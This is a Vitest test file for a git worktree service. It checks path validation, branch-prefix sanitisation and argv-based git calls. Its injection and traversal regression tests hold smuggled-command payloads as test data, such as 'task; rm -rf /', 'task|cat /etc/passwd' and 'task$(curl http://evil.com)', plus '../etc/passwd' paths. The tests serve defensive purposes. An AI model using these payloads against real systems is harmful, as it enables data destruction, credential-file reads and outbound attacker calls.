import { describe, it, expect, vi, beforeEach } from 'vitest';
import * as path from 'path';
import { makeHabitat } from './factories/board.js';
import { makeTask } from './factories/task.js';

vi.mock('../db/index.js', () => ({
  getDb: vi.fn(),
  initDb: vi.fn(),
  closeDb: vi.fn(),
}));

vi.mock('child_process', () => ({
  execFileSync: vi.fn(),
}));

vi.mock('fs', () => ({
  existsSync: vi.fn().mockReturnValue(false),
  rmSync: vi.fn(),
}));

vi.mock('../repositories/board.js', () => ({
  getHabitatById: vi.fn().mockReturnValue(null),
  createHabitat: vi.fn(),
  updateHabitat: vi.fn(),
  deleteHabitat: vi.fn(),
  listHabitats: vi.fn().mockReturnValue([]),
}));

vi.mock('../repositories/task.js', () => ({
  getTaskById: vi.fn().mockReturnValue(null),
  getHabitatIdForTask: vi.fn().mockReturnValue(null),
}));

import { execFileSync } from 'child_process';
import { existsSync } from 'fs';
import { getHabitatById } from '../repositories/board.js';
import { getTaskById, getHabitatIdForTask } from '../repositories/task.js';

const VALID_TASK_ID = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee';
const VALID_HABITAT_ID = 'habitat-1234';
const VALID_REPO_PATH = '/home/user/project';
const VALID_SETTINGS = {
  repoPath: VALID_REPO_PATH,
  branchPrefix: 'task',
  autoCleanup: true,
};

function setupHabitatWithSettings(settings = VALID_SETTINGS) {
  vi.mocked(getHabitatById).mockReturnValue(
    makeHabitat({
      id: VALID_HABITAT_ID,
      name: 'Test Habitat',
      description: '',
      gitWorktreeSettings: settings,
      createdAt: '',
      updatedAt: '',
    })
  );
}

async function getModule() {
  const mod = await import('../services/gitWorktreeService.js');
  mod._resetActiveWorktrees();
  return mod;
}

describe('Git Worktree Service', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.mocked(getHabitatById).mockReturnValue(null);
    vi.mocked(getTaskById).mockReturnValue(null);
    vi.mocked(getHabitatIdForTask).mockReturnValue(null);
  });

  describe('WorktreeValidationError', () => {
    it('is exported and has correct name', async () => {
      const { WorktreeValidationError } = await getModule();
      const err = new WorktreeValidationError('test');
      expect(err.name).toBe('WorktreeValidationError');
      expect(err.message).toBe('test');
    });
  });

  describe('validateRepoPath', () => {
    it('accepts valid absolute paths', async () => {
      const { validateRepoPath } = await getModule();
      expect(validateRepoPath('/home/user/project')).toBe('/home/user/project');
    });

    it('strips trailing slashes', async () => {
      const { validateRepoPath } = await getModule();
      expect(validateRepoPath('/home/user/project/')).toBe('/home/user/project');
    });

    it('rejects empty string', async () => {
      const { validateRepoPath } = await getModule();
      expect(() => validateRepoPath('')).toThrow();
    });

    it('rejects relative paths', async () => {
      const { validateRepoPath } = await getModule();
      expect(() => validateRepoPath('relative/path')).toThrow(/absolute path/);
    });

    it('rejects path traversal with ..', async () => {
      const { validateRepoPath } = await getModule();
      expect(() => validateRepoPath('/home/user/../etc/passwd')).toThrow(/traversal/);
    });

    it('rejects non-string input', async () => {
      const { validateRepoPath } = await getModule();
      expect(() => validateRepoPath(null as unknown as string)).toThrow();
    });
  });

  describe('validateBranchPrefix', () => {
    it('accepts safe prefixes', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(validateBranchPrefix('task')).toBe('task');
      expect(validateBranchPrefix('mission/agent-1')).toBe('mission/agent-1');
      expect(validateBranchPrefix('my_branch.v2')).toBe('my_branch.v2');
    });

    it('rejects empty string', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix('')).toThrow();
    });

    it('rejects prefix with semicolons', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix('task;rm -rf /')).toThrow(/disallowed/);
    });

    it('rejects prefix with backticks', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix('task`whoami`')).toThrow(/disallowed/);
    });

    it('rejects prefix with command substitution $()', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix('task$(whoami)')).toThrow(/disallowed/);
    });

    it('rejects prefix with single quotes', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix("task' injected")).toThrow(/disallowed/);
    });

    it('rejects prefix with double quotes', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix('task" injected')).toThrow(/disallowed/);
    });

    it('rejects prefix with spaces', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix('task injected')).toThrow(/disallowed/);
    });

    it('rejects prefix with pipe', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix('task|cat /etc/passwd')).toThrow(/disallowed/);
    });

    it('rejects prefix with ampersand', async () => {
      const { validateBranchPrefix } = await getModule();
      expect(() => validateBranchPrefix('task&&malicious')).toThrow(/disallowed/);
    });
  });

  describe('createWorktree', () => {
    it('returns null when habitat has no gitWorktreeSettings', async () => {
      const { createWorktree } = await getModule();
      const result = createWorktree('nonexistent-task', 'nonexistent-habitat');
      expect(result).toBeNull();
    });

    it('returns null when repoPath is invalid', async () => {
      setupHabitatWithSettings({ ...VALID_SETTINGS, repoPath: 'relative/path' });
      const { createWorktree } = await getModule();
      const result = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(result).toBeNull();
    });

    it('returns null when branchPrefix is invalid', async () => {
      setupHabitatWithSettings({ ...VALID_SETTINGS, branchPrefix: 'task;rm -rf /' });
      const { createWorktree } = await getModule();
      const result = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(result).toBeNull();
    });

    it('uses argv arrays not shell strings', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const { createWorktree } = await getModule();
      createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(execFileSync).toHaveBeenCalledWith(
        'git',
        expect.arrayContaining(['worktree', 'add']),
        expect.objectContaining({ cwd: expect.any(String) })
      );
    });

    it('returns worktree entry on success', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const { createWorktree } = await getModule();
      const result = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(result).not.toBeNull();
      expect(result!.repoRoot).toBe(VALID_REPO_PATH);
      expect(result!.branch).toBe(`task/${VALID_TASK_ID}`);
    });

    it('falls back to existing branch when initial add fails', async () => {
      setupHabitatWithSettings();
      let callCount = 0;
      vi.mocked(execFileSync).mockImplementation(() => {
        callCount++;
        if (callCount <= 2) throw new Error('already exists');
        if (callCount === 3) return '  task/' + VALID_TASK_ID + '  abc123';
        return '';
      });
      const { createWorktree } = await getModule();
      const result = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(result).not.toBeNull();
    });

    it('returns cached entry on second call', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const { createWorktree } = await getModule();
      const first = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      const second = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(first).toBe(second);
    });

    it('computes worktree path inside parent directory', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const { createWorktree } = await getModule();
      const result = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(result!.path).toContain('task-aaaaaaaa');
      const parent = path.resolve(VALID_REPO_PATH, '..');
      expect(result!.path.startsWith(parent + path.sep)).toBe(true);
    });
  });

  describe('removeWorktree', () => {
    it('returns false for unknown task', async () => {
      const { removeWorktree } = await getModule();
      const result = removeWorktree('nonexistent-task');
      expect(result).toBe(false);
    });

    it('removes worktree using argv-based git command', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const mod = await getModule();
      mod.createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      const result = mod.removeWorktree(VALID_TASK_ID);
      expect(result).toBe(true);
      expect(execFileSync).toHaveBeenCalledWith(
        'git',
        expect.arrayContaining(['worktree', 'remove', '--force']),
        expect.anything()
      );
    });

    it('falls back to safe deletion when git worktree remove fails', async () => {
      setupHabitatWithSettings();
      let callCount = 0;
      vi.mocked(execFileSync).mockImplementation(() => {
        callCount++;
        if (callCount === 1) return '';
        if (callCount === 2) throw new Error('worktree remove failed');
        return '';
      });
      vi.mocked(existsSync).mockReturnValue(true);
      const mod = await getModule();
      mod.createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      const result = mod.removeWorktree(VALID_TASK_ID);
      expect(result).toBe(true);
    });

    it('never passes shell strings to execFileSync', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const mod = await getModule();
      mod.createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      mod.removeWorktree(VALID_TASK_ID);
      for (const call of vi.mocked(execFileSync).mock.calls) {
        expect(typeof call[0]).toBe('string');
        expect(Array.isArray(call[1])).toBe(true);
        for (const arg of call[1] as string[]) {
          expect(typeof arg).toBe('string');
          expect(arg).not.toContain('||');
          expect(arg).not.toContain('&&');
          expect(arg).not.toContain(';');
        }
      }
    });
  });

  describe('getWorktreeInfo', () => {
    it('returns null for unknown task', async () => {
      const { getWorktreeInfo } = await getModule();
      const result = getWorktreeInfo('nonexistent-task');
      expect(result).toBeNull();
    });

    it('returns cached entry if available', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const mod = await getModule();
      const created = mod.createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      const info = mod.getWorktreeInfo(VALID_TASK_ID);
      expect(info).toBe(created);
    });

    it('detects existing worktree on disk', async () => {
      setupHabitatWithSettings();
      vi.mocked(getTaskById).mockReturnValue(makeTask({ id: VALID_TASK_ID }));
      vi.mocked(getHabitatIdForTask).mockReturnValue(VALID_HABITAT_ID);
      vi.mocked(existsSync).mockReturnValue(true);
      vi.mocked(execFileSync).mockReturnValue('.git\n');
      const { getWorktreeInfo } = await getModule();
      const result = getWorktreeInfo(VALID_TASK_ID);
      expect(result).not.toBeNull();
      expect(result!.repoRoot).toBe(VALID_REPO_PATH);
    });

    it('returns null when worktree directory does not exist', async () => {
      setupHabitatWithSettings();
      vi.mocked(getTaskById).mockReturnValue(makeTask({ id: VALID_TASK_ID }));
      vi.mocked(getHabitatIdForTask).mockReturnValue(VALID_HABITAT_ID);
      vi.mocked(existsSync).mockReturnValue(false);
      const { getWorktreeInfo } = await getModule();
      const result = getWorktreeInfo(VALID_TASK_ID);
      expect(result).toBeNull();
    });

    it('returns null when computeWorktreePath fails for non-cached info lookup', async () => {
      setupHabitatWithSettings({ ...VALID_SETTINGS, repoPath: '/' });
      vi.mocked(getTaskById).mockReturnValue(makeTask({ id: VALID_TASK_ID }));
      vi.mocked(getHabitatIdForTask).mockReturnValue(VALID_HABITAT_ID);
      const { getWorktreeInfo } = await getModule();
      const result = getWorktreeInfo(VALID_TASK_ID);
      expect(result).toBeNull();
    });

    it('returns null when git rev-parse fails for non-cached info lookup', async () => {
      setupHabitatWithSettings();
      vi.mocked(getTaskById).mockReturnValue(makeTask({ id: VALID_TASK_ID }));
      vi.mocked(getHabitatIdForTask).mockReturnValue(VALID_HABITAT_ID);
      vi.mocked(existsSync).mockReturnValue(true);
      vi.mocked(execFileSync).mockImplementation(() => {
        throw new Error('not a git repo');
      });
      const { getWorktreeInfo } = await getModule();
      const result = getWorktreeInfo(VALID_TASK_ID);
      expect(result).toBeNull();
    });
  });

  describe('isWorktreeEnabled', () => {
    it('returns false for nonexistent habitat', async () => {
      const { isWorktreeEnabled } = await getModule();
      expect(isWorktreeEnabled('nonexistent-habitat')).toBe(false);
    });

    it('returns true when habitat has worktree settings', async () => {
      setupHabitatWithSettings();
      const { isWorktreeEnabled } = await getModule();
      expect(isWorktreeEnabled(VALID_HABITAT_ID)).toBe(true);
    });
  });

  describe('getWorktreeSettings', () => {
    it('returns null for nonexistent habitat', async () => {
      const { getWorktreeSettings } = await getModule();
      expect(getWorktreeSettings('nonexistent-habitat')).toBeNull();
    });

    it('returns settings when habitat has them', async () => {
      setupHabitatWithSettings();
      const { getWorktreeSettings } = await getModule();
      const result = getWorktreeSettings(VALID_HABITAT_ID);
      expect(result).toEqual(VALID_SETTINGS);
    });
  });

  describe('Injection regression tests', () => {
    const injectionPayloads = [
      'task; rm -rf /',
      'task$(whoami)',
      'task`whoami`',
      "task' injected",
      'task" injected',
      'task|cat /etc/passwd',
      'task&&malicious',
      'task\ncurl evil.com',
      'task$(curl http://evil.com)',
    ];

    for (const payload of injectionPayloads) {
      it(`rejects branchPrefix injection: ${JSON.stringify(payload)}`, async () => {
        setupHabitatWithSettings({ ...VALID_SETTINGS, branchPrefix: payload });
        const { createWorktree } = await getModule();
        const result = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
        expect(result).toBeNull();
        expect(execFileSync).not.toHaveBeenCalled();
      });
    }
  });

  describe('Path traversal regression tests', () => {
    it('rejects repoPath with traversal', async () => {
      setupHabitatWithSettings({ ...VALID_SETTINGS, repoPath: '/home/user/../../../etc' });
      const { createWorktree } = await getModule();
      expect(createWorktree(VALID_TASK_ID, VALID_HABITAT_ID)).toBeNull();
    });

    it('rejects relative repoPath', async () => {
      setupHabitatWithSettings({ ...VALID_SETTINGS, repoPath: './project' });
      const { createWorktree } = await getModule();
      expect(createWorktree(VALID_TASK_ID, VALID_HABITAT_ID)).toBeNull();
    });

    it('rejects repoPath that is just a slash', async () => {
      setupHabitatWithSettings({ ...VALID_SETTINGS, repoPath: '/' });
      const { createWorktree } = await getModule();
      const result = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(result).toBeNull();
    });
  });

  describe('Valid worktree lifecycle (integration)', () => {
    it('create returns path, branch, and repoRoot', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const { createWorktree } = await getModule();
      const result = createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      expect(result).toEqual({
        path: expect.stringContaining('task-aaaaaaaa'),
        branch: `task/${VALID_TASK_ID}`,
        repoRoot: VALID_REPO_PATH,
      });
    });

    it('remove cleans active cache and deletes branch', async () => {
      setupHabitatWithSettings();
      vi.mocked(execFileSync).mockReturnValue('');
      const mod = await getModule();
      mod.createWorktree(VALID_TASK_ID, VALID_HABITAT_ID);
      const removed = mod.removeWorktree(VALID_TASK_ID);
      expect(removed).toBe(true);
      expect(mod.getWorktreeInfo(VALID_TASK_ID)).toBeNull();
      const branchDeleteCalls = vi.mocked(execFileSync).mock.calls.filter(
        (c) => (c[1] as string[]).includes('-D')
      );
      expect(branchDeleteCalls.length).toBeGreaterThanOrEqual(1);
    });
  });
});
